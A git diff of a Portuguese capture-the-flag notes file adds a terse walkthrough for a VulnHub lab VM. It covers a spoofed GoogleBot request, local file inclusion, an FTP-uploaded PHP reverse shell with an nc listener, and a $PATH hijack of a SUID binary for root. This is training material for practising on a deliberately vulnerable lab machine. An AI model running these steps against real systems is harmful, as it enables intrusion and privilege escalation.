@@ -21,7 +21,8 @@ Desafio 18 - CWE-521 | Tomcat7 bad .jsp | CWE-732 crontab  	    - https://www.vu
 Desafio 19 - Parameter Fuzzing | Password Spray | CVE-2017-16995 - https://www.vulnhub.com/entry/prime-1,358/</br>
 Desafio 20 - IDT 'perf_swevent_init' Local Privilege Escalation - https://www.vulnhub.com/entry/sumo-1,480/ </br>
 Desafio 21 - Solar Winds Serv-U - CVE-2019-12181 | SQLI into dumpfile - https://www.vulnhub.com/entry/election-1,503/ </br>
-Desafio 22 - - </br>
+Desafio 22 - Fake GoogleBot | LFI | Misconfiguration | $PATH abuse - https://www.vulnhub.com/entry/inclusiveness-1,422/</br>
+Desafio 23 - - https://www.vulnhub.com/entry/sar-1,425/ </br>
 <br/>**--VM--**
 
 <br> <h2>[Write-up vídeo](https://www.youtube.com/channel/UCnWSqlqL8D365ps5IECrPyg) </h2></br>
@@ -1006,3 +1007,53 @@ Desafio 22 - - </br>
 		gcc 47009.c -o beco21
 		./beco21
 		 root
+
+
+<h3>Dia 22 			28/9/2020</h3>
+
+	*scan
+		-sV -p-
+		
+		#searchploit vsftpd 
+		
+		*dirb
+			http://ip_vm 
+			
+			http://ip_vm/robots.txt
+				curl -H "User-Agent: GoogleBot" http://ip_vm/robots.txt
+					ip/secret_information
+					http://192.168.100.28/secret_information/?lang=es.php
+						http://192.168.100.28/secret_information/?lang=/etc/vsftpd.conf
+							anon_root=/var/ftp/
+	*cd /tmp
+		ftp ip_vm
+		user: anonymous
+		pass: 
+			cd pub
+			kali: cp /usr/share/webshells/php/php-reverse-shell.php /tmp ; mv /tmp/php-reverse-shell.php beco22.php ; nano beco22.php 
+				alterar o ip e porta
+				nc -lnvp 443
+				
+			ftp: put beco22.php
+				browser: http://192.168.100.28/secret_information/?lang=/var/ftp/pub/beco22.php
+				
+		*nc
+			find / -perm -u=s -type f 2>&-
+						#/home/tom/rootshell
+						cd /home/tom
+						
+						cat rootshell.c
+							
+							
+			cd /tmp
+			echo 'printf "tom"' > whoami ; chmod 777 whoami
+				cat whoami
+				./whoami
+				
+				export PATH=/tmp:$PATH
+				
+				whoami
+				
+				cd /home/tom
+				./rootshell
+
